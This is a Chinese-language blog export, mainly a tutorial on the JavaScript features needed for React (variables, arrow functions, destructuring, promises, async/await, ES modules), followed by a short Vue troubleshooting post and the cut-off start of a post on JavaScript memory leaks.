eject？create-react-app已经做了很多工作了，但你想要完成更多的工作时，就要弹出配置文件来自己配置。 因为create-react-app 是为了满足大部分人的需求和有限的配置，当你有一些独特的需求时，就需要自己来配置一些内容了。 当你使用npm eject时，你的页面就不会自动更新了，但你可以在Babel和Webpack配置中获得更大的灵活性。 eject时是不可逆的，当你执行后你会获得两个新的文件夹，配置和脚本。你就可以开始自由的编辑他们了。 下节预告：下节我们将学习在学习React之前需要了解的JS语法及一些知识 使用React需要什么样的JS能力 在深入学习React之前找到你必须要掌握的内容 如果你想学习React时，首先你需要做一些事情。您必须熟悉一些必要的技术，特别是你将在React中反复使用的一些最新JavaScript特性相关的技术。 有些人以为一些功能是React提供的一些特定的功能，实际上它们只是Javascript最新的语法。 立即掌握这些新语法，成为这方面的专家是不可能的，也没必要。但你如果想要深入研究React，那你就需要熟练掌握他们了。 我会把它们列举下来让你快速了解一下。 变量 变量是分配给标识符的文字，因此您可以引用它并在后面的程序里使用它。学习如何用JavaScript声明一个。 JavaScript中的变量没有附加任何类型。将特定的文字类型分配给变量后，可以稍后再给这个变量分配类型，而不会出现类型错误或任何问题。 所以这就是为什么有时候Javascript会报’untyped’这样的问题。 一个变量必须在你使用之前就声明。有三种方法可以做到这一点，使用var、let或const，这三种方法在以后与变量的交互方式上有所不同。 用Var 知道ES2015，var一直都是定义变量的唯一方法。 var a = 0 如果你忘了添加var，你给未声明的变量赋值，结果可能会有所不同，在严格模式下，会得到一个错误，在旧的环境，或者禁用严格模式下，就会使得该变量成为一个全局变量，赋值也自然会赋值给一个全局变量。 如果你没有将变量初始化，那他的值就是undefined var a //typeof a === &#x27;undefined&#x27; 你可以多次声明变量 var a = 1 var a = 2 最重要的，你可以一次就声明多个变量 var a = 1, b = 2 作用域是代码中变量可见的部分（有效）。在函数外部声明一个变量，变量就是全局的，所有的函数都可以获得该变量的值，但在函数内部声明一个变量，变量就是局部的，只有在该函数内才能获得该变量的值，就像函数的一个参数。 在与全局变量同名的函数中定义的任何变量都优先于全局变量，并对其进行跟踪。 重要的是要理解一个块(由一对花括号标识)没有定义一个新的作用域。新作用域只在创建函数时创建，因为var没有块作用域，而是函数作用域。 函数内部,在函数的所有代码中，变量在任何位置都是可见的,即使函数的变量声明在函数最后仍然可以引用。,因为JavaScript执行代码之前将所有变量提升。但为了避免混淆，总是在函数的开头声明变量。 用Let let是ES2015中引入的一个新特性，它本质上是var的块范围版本。它的作用域仅限于定义它的块、语句或表达式以及所有包含的内部块。 现代JavaScript开发人员可能选择只使用let，而完全放弃使用var。 如果let看起来是一个模糊的术语，只要看let color = 'red’就是让颜色是红色，这就更容易理解了 与var相反，在任何函数外部定义let都不会创建全局变量。 用Const 用var或let声明的变量可以稍后在程序中更改并重新分配。一旦const被初始化，它的值就再也不会被更改，也不能被重新分配到不同的值。 const a = &#x27;test&#x27; 我们不能给a常量定义不同的文字了。但是，如果对象提供了改变其内容的方法，我们可以对它进行变异。 const 定义了就不能修改或重新赋值 const和let一样都有块级作用域 现代JavaScript开发人员可能会选择始终对不需要在程序中稍后重新分配的变量使用const。 为什么?因为我们应该总是使用最简单的结构来避免将来犯错误。 箭头函数 箭头函数是在ES6 / ECMAScript 2015中引入的，自从引入以来，它们彻底改变了JavaScript代码的外观(和工作方式)。 在我看来，这种变化非常受欢迎，以至于你现在很少看到在现代代码库中使用function关键字。 从视觉上看，这是一个简单而受欢迎的改变，它允许你用更短的语法编写函数，从: const myFunction = function() &#123; //... &#125; 到 const myFunction = () =&gt; &#123; //... &#125; 如果函数体只包含一条语句，则可以省略括号，并将所有内容写在一行中: const myFunction = () =&gt; doSomething() 参数在括号中传递: const myFunction = (param1, param2) =&gt; doSomething(param1, param2) 如果有一个(且只有一个)参数，可以完全省略括号: const myFunction = param =&gt; doSomething(param) 由于这种简短的语法，箭头函数让我们能使用小体积的函数。 隐式返回 箭头函数允许你使用隐式返回：返回的值不需要使用return关键字。 当函数体中有一行语句时，它就可以工作: const myFunction = () =&gt; &#x27;test&#x27; myFunction() //&#x27;test&#x27; 另一个例子，当返回一个对象时，记得将大括号括起来，以避免它被认为是括起来的函数的括号: const myFunction = () =&gt; (&#123; value: &#x27;test&#x27; &#125;) myFunction() //&#123;value: &#x27;test&#x27;&#125; this在箭头函数里如何工作 this是一个很难理解的概念。因为它会根据上下文和JavaScript的模式(严格模式或非严格模式)产生不同的含义。 澄清这个概念很重要，因为在箭头函数中的this与常规函数中的this非常不同。 当定义一个对象的方法时，在常规函数中的this指向这个对象，案例如下： const car = &#123; model: &#x27;Fiesta&#x27;, manufacturer: &#x27;Ford&#x27;, fullName: function() &#123; return `$&#123;this.manufacturer&#125; $&#123;this.model&#125;` &#125; &#125; car.fullName() //&quot;Ford Fiesta&quot; 执行car.fullName()时会返回&quot;Ford Fiesta&quot; 带有箭头函数的this作用域是从执行上下文中继承的。箭头函数根本不绑定this，因此它的值将在调用堆栈中查找。因此在这个代码car.fullName()中不起作用，并将返回字符串“undefined undefined”: const car = &#123; model: &#x27;Fiesta&#x27;, manufacturer: &#x27;Ford&#x27;, fullName: () =&gt; &#123; return `$&#123;this.manufacturer&#125; $&#123;this.model&#125;` &#125; &#125; car.fullName() //&quot;undefined undefined&quot; 参考上面两个例子，可以看出，箭头函数并不适用于对象的方法。 箭头函数也不能用作构造函数，因为实例化对象时将报错TypeError。当不需要动态上下文时，应该在这里使用箭头函数来代替常规函数。 在处理事件时还有一个问题，DOM事件侦听器将this设置为目标元素，如果在事件处理程序中依赖于此元素，则需要一个常规函数: const link = document.querySelector(&#x27;#link&#x27;) link.addEventListener(&#x27;click&#x27;, () =&gt; &#123; // this === window &#125;) const link = document.querySelector(&#x27;#link&#x27;) link.addEventListener(&#x27;click&#x27;, function() &#123; // this === link &#125;) 使用Rest和Spread处理对象和数组 学习使用JavaScript处理数组和对象的两种现代技术 您可以使用spread操作符展开数组、对象或字符串 … 看下面的例子： const a = [1, 2, 3] 你可以像下面一样创建一个新数组 const b = [...a, 4, 5, 6] 还可以像下面一样创建一个数组的副本 const b = [...a] 也能用这种方式拷贝一个对象 const newObj = &#123; ...oldObj &#125; 使用字符串时，spread操作符创建一个数组，数组内是每个字符: const hey = &#x27;hey&#x27; const arrayized = [...hey] // [&#x27;h&#x27;, &#x27;e&#x27;, &#x27;y&#x27;] 这个操作符有一些非常有用的应用。最重要的是能够以一种非常简单的方式将数组作为函数参数: const f = (foo, bar) =&gt; &#123;&#125; const a = [1, 2] f(...a) (在过去，你可以用f.apply(null, a) 来做这个但是这样做不太好，可读性也不好) rest元素和spread元素在使用数组解构赋值时非常有用: const numbers = [1, 2, 3, 4, 5] [first, second, ...others] = numbers const numbers = [1, 2, 3, 4, 5] const sum = (a, b, c, d, e) =&gt; a + b + c + d + e const sum = sum(...numbers) ES2018引入了rest属性，它们是相同的，但是是用于对象。 Rest属性 const &#123; first, second, ...others &#125; = &#123; first: 1, second: 2, third: 3, fourth: 4, fifth: 5 &#125; first // 1 second // 2 others // &#123; third: 3, fourth: 4, fifth: 5 &#125; 扩展属性允许通过合并在扩展操作符之后传递的对象属性来创建一个新对象: const items = &#123; first, second, ...others &#125; items //&#123; first: 1, second: 2, third: 3, fourth: 4, fifth: 5 &#125; 数组和对象的解构赋值 学习如何使用解构赋值语法来处理JavaScript中的数组和对象 给定一个对象，使用解构赋值语法，您可以提取一些值，并将它们放入命名变量: const person = &#123; firstName: &#x27;Tom&#x27;, lastName: &#x27;Cruise&#x27;, actor: true, age: 54 //made up &#125; const &#123; firstName: name, age &#125; = person //name: Tom, age: 54 name和age包含了所需要的值。 这个语法也可以在数组上使用 const a = [1, 2, 3, 4, 5] const [first, second] = a 该语句通过从数组a中获取索引0、1、4的项来创建3个新变量（first，second，fifth） const [first, second, , , fifth] = a 模板字符串 在ES2015(又名ES6)中引入的模板字符串提供了一种声明字符串的新方法，也提供了一些已经非常流行的有趣的新构造方法。 模板字符串介绍 模板文字是ES2015 / ES6的新特性，与ES5及以下版本相比，它允许你以一种新颖的方式处理字符串。 语法乍一看非常简单，只需使用反引号而不是单引号或双引号: const a_string = `something` 它们是很独特的的，因为它们提供了许多用引号构建的普通字符串所没有的特性，特别是: 它们提供了一个很好的语法来定义多行字符串 它们提供了一种简单的方法在字符串中用变量和表达式插值 它们允许您使用模板标记创建DSL (DSL意味着特定于领域的语言，例如在React by style组件中使用DSL为组件定义CSS) 让我们详细研究上面三个东西 多行字符串 在es6之前，要创建一个跨越两行的字符串，您必须在一行末尾使用\\字符 const string = &#x27;first part \\ second part&#x27; 这允许在两行创建一个字符串，但它只呈现在一行: first part second part 要在多行渲染字符串，你需要显式地在每行末尾添加\\n，如下所示: const string = &#x27;first line\\n \\ second line&#x27; //或者 const string = &#x27;first line\\n&#x27; + &#x27;second line&#x27; 用模板字符串就简单多了 一旦模板文字使用回车，你只需按回车键来创建一个没有特殊字符的新行，它就会按原样呈现: const string = `Hey this string is awesome!` //结果如下 Hey this string is awesome! 记住，模板字符串的空格是有意义的，所以这样做: const string = `First Second` //结果如下 First Second 解决这个问题的一种简单方法是，在第一行中设置一个空行，并在结束后加上trim()方法，这将消除第一个字符之前的任何空格: const string = ` First Second`.trim() 模板字符串插值 模板字符串提供了一种将变量和表达式插入字符串的简单方法。 你可以用这样的语法$&#123;...&#125;： const var = &#x27;test&#x27; const string = `something $&#123;var&#125;` //something test 在$&#123;...&#125;里你可以插入任何东西，甚至是表达式 const string = `something $&#123;1 + 2 + 3&#125;` const string2 = `something $&#123;foo() ? &#x27;x&#x27; : &#x27;y&#x27;&#125;` Class（类） 2015年，ECMAScript 6 (ES6)标准引入了类。 JavaScript有一种非常少见的实现继承的方法:原型继承。虽然原型继承在我看来很好，但它不同于大多数其他流行编程语言的继承实现，后者是基于类的。 来自Java、Python或其他语言的人很难理解原型继承的复杂性，所以ECMAScript委员会决定在原型继承的基础上添加语法糖，这样就像其他流行实现中的基于类的继承一样。 这一点很重要:底层的JavaScript仍然是相同的，您还是可以用常规的方式访问对象原型。 一个class类的定义 一个类长下面这样 class Person &#123; constructor(name) &#123; this.name = name &#125; hello() &#123; return &#x27;Hello, I am &#x27; + this.name + &#x27;.&#x27; &#125; &#125; 类有一个标识符，我们可以使用它来使用new ClassIdentifier()创建新对象 初始化对象时，调用constructor方法，并传递任意参数。 一个类也有它所需要的所有方法。在这种情况下，hello是一个方法，这个类派生的所有对象都可以调用这个方法: const flavio = new Person(&#x27;Flavio&#x27;) flavio.hello() 类的实例 类可以扩展另一个类，使用该类初始化的对象继承父类的所有方法。 如果继承的类的方法与层次结构中较高层的类的名称相同，则最近的方法优先: class Programmer extends Person &#123; hello() &#123; return super.hello() + &#x27; I am a programmer.&#x27; &#125; &#125; const flavio = new Programmer(&#x27;Flavio&#x27;) flavio.hello() //输出 Hello, I am Flavio. I am a programmer. 类没有显式的类变量声明，但是必须初始化构造函数中的任何变量 在类中，可以用super()来引用父类。 静态方法 通用方法是在实例上定义的，而不是在类上定义的。 静态方法在类上执行: class Person &#123; static genericHello() &#123; return &#x27;Hello&#x27; &#125; &#125; Person.genericHello() //Hello 私有方法 JavaScript没有内置的方法来定义私有或受保护的方法。（可以参考闭包等概念） 有一些变通方法，但我不会在这里描述它们。 Getters 和 setters 你可以添加以get或set为前缀的方法来创建getter和setter，这是根据您正在做的事情执行两段不同的代码:访问变量或修改其值。 class Person &#123; constructor(name) &#123; this._name = name &#125; set name(value) &#123; this._name = value &#125; get name() &#123; return this._name &#125; &#125; 如果您只有一个getter，则无法设置该属性，并且任何这样做的尝试都将被忽略: class Person &#123; constructor(name) &#123; this.name = name &#125; get name() &#123; return this.name &#125; &#125; 如果你只有一个setter，你可以改变值，但不能从外部访问它: class Person &#123; constructor(name) &#123; this.name = name &#125; set name(value) &#123; this.name = value &#125; &#125; 回调 计算机在设计上是异步的。 异步意味着事情可以独立于主程序流发生。 在当前的客户端计算机中，每个程序都运行一个特定的时间段，然后停止执行，让另一个程序继续执行。这个东西以一种无法察觉的速度循环运行，我们认为计算机同时运行许多程序，但这是一种错觉(多处理器机器除外)。 程序在内部使用中断——这是一种向处理器发出的信号，以引起系统的注意。 我不会深入讨论它的内部原理，但是要记住，程序是异步的是很正常的，在它们需要注意的时候停止它们的执行，而计算机可以同时执行其他事情。当程序正在等待来自网络的响应时，它不能在请求完成之前停止处理器。 通常，编程语言是同步的，有些语言提供了一种方法来管理语言或库中的异步性。C, Java, c#， PHP, Go, Ruby, Swift, Python，它们默认都是同步的。其中一些通过使用线程处理异步，生成一个新进程。 JavaScript默认是同步的，并且是单线程的。这意味着代码不能创建新线程并并行运行。 一行接一行的执行代码，例如: const a = 1 const b = 2 const c = a * b console.log(c) doSomething() 但是JavaScript是在浏览器中诞生的，它最初的主要工作是响应用户操作，比如onClick、onMouseOver、onChange、onSubmit等等。它如何使用同步编程模型实现这一点呢? 答案就在它所处的环境中。浏览器提供了一种方法，它提供了一组api来处理这种功能。 最近，NodeJS引入了一个非阻塞I/O环境，将这个概念扩展到文件访问、网络调用等。 你不知道用户什么时候会点击按钮，所以你要做的是，为点击事件定义一个事件处理器。此事件处理程序接受一个函数，该函数将在事件触发时被调用: document.getElementById(&#x27;button&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123; //item clicked &#125;) 这就是回调（callback) 回调是一个简单的函数，它作为一个值传递给另一个函数，只在事件发生时执行。我们可以这样做，因为JavaScript具有一流的函数，可以将其分配给变量并传递给其他函数(称为高阶函数) 将所有代码包装在windows对象上的load事件监听器中是很常见的，它只在页面准备好时才运行回调函数: window.addEventListener(&#x27;load&#x27;, () =&gt; &#123; //window loaded //do what you want &#125;) 回调可以用在任何地方，不只是dom事件上 一个常用的定时器例子： setTimeout(() =&gt; &#123; // runs after 2 seconds &#125;, 2000) XHR请求也接受回调，在本例中，它将一个函数分配给一个属性，该属性将在特定事件发生时被调用(在本例中，请求状态发生变化): const xhr = new XMLHttpRequest() xhr.onreadystatechange = () =&gt; &#123; if (xhr.readyState === 4) &#123; xhr.status === 200 ? console.log(xhr.responseText) : console.error(&#x27;error&#x27;) &#125; &#125; xhr.open(&#x27;GET&#x27;, &#x27;https://yoursite.com&#x27;) xhr.send() 处理回调中的错误 如何在回调处理错误?一个非常常见的策略是使用Node所采用的方法:任何回调函数中的第一个参数都是error对象:error-first回调 如果没有错误，则对象为null。如果有错误，它包含错误的一些描述和其他信息。 fs.readFile(&#x27;/file.json&#x27;, (err, data) =&gt; &#123; if (err !== null) &#123; //handle error console.log(err) return &#125; //no errors, process data console.log(data) &#125;) 回调存在的问题 回调对于简单的情况非常有用 然而，每个回调都会增加一个嵌套级别，当你有很多回调时，代码开始变得非常复杂: window.addEventListener(&#x27;load&#x27;, () =&gt; &#123; document.getElementById(&#x27;button&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123; setTimeout(() =&gt; &#123; items.forEach(item =&gt; &#123; //your code here &#125;) &#125;, 2000) &#125;) &#125;) 这只是一个简单的4层代码，但我见过更多级别的嵌套，这并不有趣。 怎么解呢? 回调的替代品 从ES6开始，JavaScript引入了几个特性，帮助我们处理不涉及回调的异步代码: Promises (ES6) Async/Await (ES8) Promise Promise是处理异步代码的一种方法，无需在代码中编写太多回调。 尽管它们已经存在多年，但是在ES2015中已经被标准化并引入，现在在ES2017中已经被异步函数所取代。 Async函数使用promise API作为它们的构建块，因此理解它们是非常重要的，即使在较新的代码中您可能会使用Async函数而不是promise。 简而言之，Promise是如何工作的 一旦Promise被调用，它将以pending状态启动。这意味着调用方函数将继续执行，同时等待Promise自己进行处理，并给调用方函数一些反馈。 此时，调用方函数等待它以resolved状态或rejected状态返回承诺，但如您所知，JavaScript是异步的，因此函数在Promise工作时继续执行。 哪个JS API使用Promise? 除了您自己的代码和库代码之外，Promises还被标准的现代Web api(如Fetch或Service Workers)使用。 在现代JavaScript中，您不太可能不使用承诺，所以让我们开始深入研究它们。 创建一个promise Promise API公开了一个Promise构造函数，您可以使用它进行初始化new Promise()： let done = true const isItDoneYet = new Promise((resolve, reject) =&gt; &#123; if (done) &#123; const workDone = &#x27;Here is the thing I built&#x27; resolve(workDone) &#125; else &#123; const why = &#x27;Still working on something else&#x27; reject(why) &#125; &#125;) 正如您所看到的，promise检查done全局常量，如果它为真，则返回一个resolve的promise，否则返回一个 reject的promise。 使用resolve和reject，我们可以返回一个值，在上面的例子中，我们只返回一个字符串，但它也可以是一个对象。 使用promise 在上一节中，我们介绍了如何创建承诺。 现在让我们看看如何使用承诺。 const isItDoneYet = new Promise() //... const checkIfItsDone = () =&gt; &#123; isItDoneYet .then(ok =&gt; &#123; console.log(ok) &#125;) .catch(err =&gt; &#123; console.error(err) &#125;) &#125; 运行checkIfItsDone()将执行isItDoneYet() promise，并使用then回调等待它解决，如果出现错误，它将在catch回调中处理它。 promise链 一个promise可以返回给另一个promise，创建一个promise链。 Fetch API是链接承诺的一个很好的例子，它是XMLHttpRequest API之上的一层，我们可以使用它来获取资源，并在获取资源时对要执行的promise链进行排队。 Fetch API是一种基于promise的机制，调用Fetch()相当于使用new promise()定义我们自己的promise。 例子： const status = response =&gt; &#123; if (response.status &gt;= 200 &amp;&amp; response.status &lt; 300) &#123; return Promise.resolve(response) &#125; return Promise.reject(new Error(response.statusText)) &#125; const json = response =&gt; response.json() fetch(&#x27;/todos.json&#x27;) .then(status) .then(json) .then(data =&gt; &#123; console.log(&#x27;Request succeeded with JSON response&#x27;, data) &#125;) .catch(error =&gt; &#123; console.log(&#x27;Request failed&#x27;, error) &#125;) 在本例中，我们调用fetch()从TODO中获取TODO项的列表。在域根目录中找到json文件，然后创建promise链。 运行 fetch()后返回一个响应，它有很多属性，在这些属性中我们引用: status表示HTTP状态代码的数值 statusText状态消息，如果是OK就是请求成功 response也有一个json()方法，它返回一个promise，该promise将解析处理并转换为JSON的主体内容。 在这些前提下，会发生这样的情况:链中的第一个promise是我们定义的一个函数status()，它检查响应状态，如果它不是一个成功响应(在200到299之间)，则拒绝该promise。 此操作将导致promise链跳过列出的所有链接的promise，并直接跳到底部的catch()语句，记录请求失败的文本和错误消息。 如果成功，则调用我们定义的json()函数。由于上一个promise成功时返回响应对象，所以我们将它作为第二个promise的输入。 在这种情况下，我们返回JSON处理过的数据，所以第三个promise直接接收JSON: .then((data) =&gt; &#123; console.log(&#x27;Request succeeded with JSON response&#x27;, data) &#125;) 我们只需将其打印到控制台 处理错误 在上面的例子中，在上一节中，我们有一个catch，它被附加到promise链中。 当promise链中的任何内容失败并引发错误或拒绝promise时，该控件将转到链中最近的catch()语句。 new Promise((resolve, reject) =&gt; &#123; throw new Error(&#x27;Error&#x27;) &#125;).catch(err =&gt; &#123; console.error(err) &#125;) // or new Promise((resolve, reject) =&gt; &#123; reject(&#x27;Error&#x27;) &#125;).catch(err =&gt; &#123; console.error(err) &#125;) 串联错误 如果在catch()中引发错误，可以附加第二个catch()来处理它，依此类推。 new Promise((resolve, reject) =&gt; &#123; throw new Error(&#x27;Error&#x27;) &#125;) .catch(err =&gt; &#123; throw new Error(&#x27;Error&#x27;) &#125;) .catch(err =&gt; &#123; console.error(err) &#125;) 用 Promise.all()来编排promise 如果您需要同步执行不同的promise，Promise.all()可以帮助您定义一个promise列表，并在所有promise都得到解析时执行某些操作。 例子： const f1 = fetch(&#x27;/something.json&#x27;) const f2 = fetch(&#x27;/something2.json&#x27;) Promise.all([f1, f2]) .then(res =&gt; &#123; console.log(&#x27;Array of results&#x27;, res) &#125;) .catch(err =&gt; &#123; console.error(err) &#125;) ES2015析构赋值语法也允许您这样做 Promise.all([f1, f2]).then(([res1, res2]) =&gt; &#123; console.log(&#x27;Results&#x27;, res1, res2) &#125;) 当然你不局限于使用fetch，任何promise都是好的。 用Promise.race()编排promise Promise.race()在您传递给它的某个promise解析时立即运行，并且在解析第一个promise的结果时，它只运行附加的回调一次（最先执行成功的promise后就返回该promise，其他的promise就不管了）。 例子： const promiseOne = new Promise((resolve, reject) =&gt; &#123; setTimeout(resolve, 500, &#x27;one&#x27;) &#125;) const promiseTwo = new Promise((resolve, reject) =&gt; &#123; setTimeout(resolve, 100, &#x27;two&#x27;) &#125;) Promise.race([promiseOne, promiseTwo]).then(result =&gt; &#123; console.log(result) // &#x27;two&#x27; &#125;) Async/Await JavaScript在很短的时间内从回调发展到了promise (ES2015)，而且由于ES2017异步JavaScript使用async/ wait语法更加简单。 异步函数是 promise和generate的组合，基本上，它们是比promise更高层次的抽象。让我重复一遍:async/ wait基于promise。 为什么要Async/Await 这种方式减少了promise的使用，和‘不打破promise链’的限制 当promise在ES2015中引入时，它们是为了解决异步代码的问题，它们确实解决了这个问题，但是在ES2015和ES2017分开的两年时间里，很明显promise并不是最终的解决方案。 引入promise是为了解决著名的回调地狱问题，但它们本身也带来了复杂性，以及语法复杂性。 它们语义化更好，可以向开发人员提供更好的语法，因此当时机成熟时，我们就可以使用async函数。 它们使代码看起来是同步的，但在幕后它是异步的，非阻塞的。 async如何工作的 一个async函数返回一个promise，就像这个例子: const doSomethingAsync = () =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; resolve(&#x27;I did something&#x27;), 3000) &#125;) &#125; 当您想要调用这个函数时，您需要预先等待，调用代码将停止，直到promise被resolve或reject。一个警告:函数必须定义为async的。这里有一个例子: const doSomething = async () =&gt; &#123; console.log(await doSomethingAsync()) &#125; 一个快速的案例 这是一个简单的async/await 的例子，用于异步运行一个函数: const doSomethingAsync = () =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; resolve(&#x27;I did something&#x27;), 3000) &#125;) &#125; const doSomething = async () =&gt; &#123; console.log(await doSomethingAsync()) &#125; console.log(&#x27;Before&#x27;) doSomething() console.log(&#x27;After&#x27;) 以上代码将打印以下内容到浏览器控制台: Before After I did something //after 3s 所有的事都是promise 在任何函数前面加上async关键字意味着函数将返回一个promise。 即使它没有显式地返回promise，它也会在内部让它返回一个promise。 这就是为什么这个代码是有效的: const aFunction = async () =&gt; &#123; return &#x27;test&#x27; &#125; aFunction().then(alert) // This will alert &#x27;test&#x27; 上面也和下面一样 const aFunction = async () =&gt; &#123; return Promise.resolve(&#x27;test&#x27;) &#125; aFunction().then(alert) // This will alert &#x27;test&#x27; 代码更易读 正如您在上面的示例中看到的，我们的代码看起来非常简单。将其与使用纯promise(带有链接和回调函数)的代码进行比较。 这是一个非常简单的例子，当代码更加复杂时，主要的好处就会显现出来。 例如，下面是如何获得JSON资源，并使用promise对其进行解析: const getFirstUserData = () =&gt; &#123; return fetch(&#x27;/users.json&#x27;) // get users list .then(response =&gt; response.json()) // parse JSON .then(users =&gt; users[0]) // pick first user .then(user =&gt; fetch(`/users/$&#123;user.name&#125;`)) // get user data .then(userResponse =&gt; response.json()) // parse JSON &#125; getFirstUserData() 用await/async来实现上面的功能时 const getFirstUserData = async () =&gt; &#123; const response = await fetch(&#x27;/users.json&#x27;) // get users list const users = await response.json() // parse JSON const user = users[0] // pick first user const userResponse = await fetch(`/users/$&#123;user.name&#125;`) // get user data const userData = await user.json() // parse JSON return userData &#125; getFirstUserData() 串联多个异步函数 异步函数可以很容易地链接起来，而且语法比普通的承诺更易读 const promiseToDoSomething = () =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; resolve(&#x27;I did something&#x27;), 10000) &#125;) &#125; const watchOverSomeoneDoingSomething = async () =&gt; &#123; const something = await promiseToDoSomething() return something + &#x27; and I watched&#x27; &#125; const watchOverSomeoneWatchingSomeoneDoingSomething = async () =&gt; &#123; const something = await watchOverSomeoneDoingSomething() return something + &#x27; and I watched as well&#x27; &#125; watchOverSomeoneWatchingSomeoneDoingSomething().then(res =&gt; &#123; console.log(res) &#125;) //输出 I did something and I watched and I watched as well 更好debug 调试promise很困难，因为调试器不会跳过异步代码。 Async/ wait使这一切变得非常简单，因为对于编译器来说，它就像同步代码一样。 ES 模块 ES模块是用于处理模块的ECMAScript标准。 nodeJS多年来一直使用CommonJS标准，浏览器从来没有模块系统，因为每一个重大决策，比如模块系统，都必须首先由ECMAScript标准化，然后由浏览器实现。 这个标准化过程用ES6完成，浏览器开始实现这个标准，试图保持一切正常运行，以相同的方式工作，现在在Chrome、Safari、Edge和Firefox(从版本60开始)中都支持ES模块。 模块非常酷，因为它们允许您封装各种功能，并将这些功能作为库公开给其他JavaScript文件。 ES模块语法 导入模块的语法是: import package from &#x27;module-name&#x27; 用CommonJS 时： const package = require(&#x27;module-name&#x27;) 模块是一个JavaScript文件，它使用export关键字导出一个或多个值(对象、函数或变量)。例如，这个模块导出一个函数，返回一个大写字符串: uppercase.js export default str =&gt; str.toUpperCase() 在本例中，模块定义了一个default export，因此它可以是一个匿名函数。否则，它需要一个名称来将其与其他导出区分开。 现在，通过导入这个文件，任何其他JavaScript模块都可以用导入的uppercase.js提供的功能。 HTML页面可以使用 标记添加模块，该标记具有特殊的```type``` &lt;script type=&quot;module&quot; src=&quot;index.js&quot;&gt;&lt;/script&gt; 注意:此模块导入的行为类似于defer脚本加载。 需要注意的是，使用type=&quot;module&quot;加载的任何脚本都是在严格模式下加载的。 在这个例子中，uppercase.js 模块定义了一个 default export,所以当我们导入它的时候，我们可以给它分配一个我们喜欢的名字: import toUpperCase from &#x27;./uppercase.js&#x27; 我们可以这样使用 toUpperCase(&#x27;test&#x27;) //&#x27;TEST&#x27; 您还可以使用模块导入的绝对路径，来引用在另一个域中定义的模块: import toUpperCase from &#x27;https://flavio-es-modules-example.glitch.me/uppercase.js&#x27; 这也是有效的导入语法: import &#123; foo &#125; from &#x27;/uppercase.js&#x27; import &#123; foo &#125; from &#x27;../uppercase.js&#x27; 下面是不对的： import &#123; foo &#125; from &#x27;uppercase.js&#x27; import &#123; foo &#125; from &#x27;utils/uppercase.js&#x27; 它要么是绝对的，要么在名字前有一个./或者/。 其他 import/export方法 我们看到上面的例子: export default str =&gt; str.toUpperCase() 这将创建一个默认导出。在一个文件中，你可以导出多个东西，通过使用以下语法: const a = 1 const b = 2 const c = 3 export &#123; a, b, c &#125; 另一个模块可以使用import *来导入所有这些export的内容 import * from &#x27;module&#x27; 你可以只导入其中的几个导出，使用析构赋值: import &#123; a &#125; from &#x27;module&#x27; import &#123; a, b &#125; from &#x27;module&#x27; 为了方便，可以使用as重命名任何导入 import &#123; a, b as two &#125; from &#x27;module&#x27; 您可以按名称导入默认导出和任何非默认导出，如以下常见的React导入: import React, &#123; Component &#125; from &#x27;react&#x27; CORS(跨域) 使用CORS获取模块。这意味着如果您引用来自其他域的脚本，它们必须具有允许跨站点加载的有效CORS头（比如Access-Control-Allow-Origin: *） 那么不支持模块的浏览器呢? 结合使用type=&quot;module&quot; 和nomodule &lt;script type=&quot;module&quot; src=&quot;module.js&quot;&gt;&lt;/script&gt; &lt;script nomodule src=&quot;fallback.js&quot;&gt;&lt;/script&gt; ES模块是现代浏览器中引入的最大特性之一。它们是ES6的一部分，但实现它们的道路是漫长的。 我们现在可以使用它们了!但是我们还必须记住，如果有多个模块，那么页面的性能将受到影响，因为这是浏览器在运行时必须执行更多一个步骤。 即使ES模块在浏览器里能用了，Webpack可能仍然是一个巨大的玩家，但是直接在语言中构建这样的特性对于统一模块在客户端和nodeJS的工作方式是非常重要的。 下节预告：React的概念","categories":[],"tags":[]},{"title":"Vue使用踩坑记录","slug":"Vue使用踩坑记录","date":"2019-01-14T05:52:15.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2019/01/14/Vue使用踩坑记录/","link":"","permalink":"https://harrypangpang.github.io/2019/01/14/Vue%E4%BD%BF%E7%94%A8%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/","excerpt":"","text":"主要记录在Vue项目中遇到的一些问题 error: Unexpected console statement (no-console) at src\\components\\leftSideBar\\index.vue:41:9: 解决： /* eslint no-console: 0*/ console.log(&#x27;a&#x27;) 使用module.exports时遇到问题 menu-conf.js?6ce3:1 Uncaught TypeError: Cannot assign to read only property &#x27;exports&#x27; of object &#x27;#&lt;Object&gt;&#x27; &quot;export &#x27;default&#x27; (imported as &#x27;sidebarconf&#x27;) was not found in &#x27;../../conf/menu-conf&#x27; 解决： 改用 let a = &#123; &#125; export default a;","categories":[],"tags":[]},{"title":"Javascript常见的内存泄漏","slug":"Javascript常见的内存泄漏","date":"2019-01-11T07:42:13.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2019/01/11/Javascript常见的内存泄漏/","link":"","permalink":"https://harrypangpang.github.io/2019/01/11/Javascript%E5%B8%B8%E8%A7%81%E7%9A%84%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/","excerpt":"","text":"什么是内存泄露？ 程序的运行需要内存。只要程序提出要求，操作系统或者运行时（runtime）就必须供给内存。 对于持续运行的服务进程（daemon），必须及时释放不再用到的内存。否则，内存占用越来越高，轻则影响系统性能，重则导致进程崩溃。 白话解释就是你写的代码里有些东西不用了，就别在保存再内存中了，不然好比你开了100个迅雷CPU卡不卡？卡，但你其实真正用到的只是其中一个迅雷。这就是内存泄漏 想要理解JavaScript的内存泄漏，就要先了解一下js的自动垃圾收集机制 js的自动垃圾收集机制 在编写JS时，我们不用像C++一样要手工跟踪内存的使用情况，JS的内存分配和无用内存的回收完全实现了自动化。 JS常用的垃圾收集机制有两种：1. 标记清除 2. 引用计数 标记清除 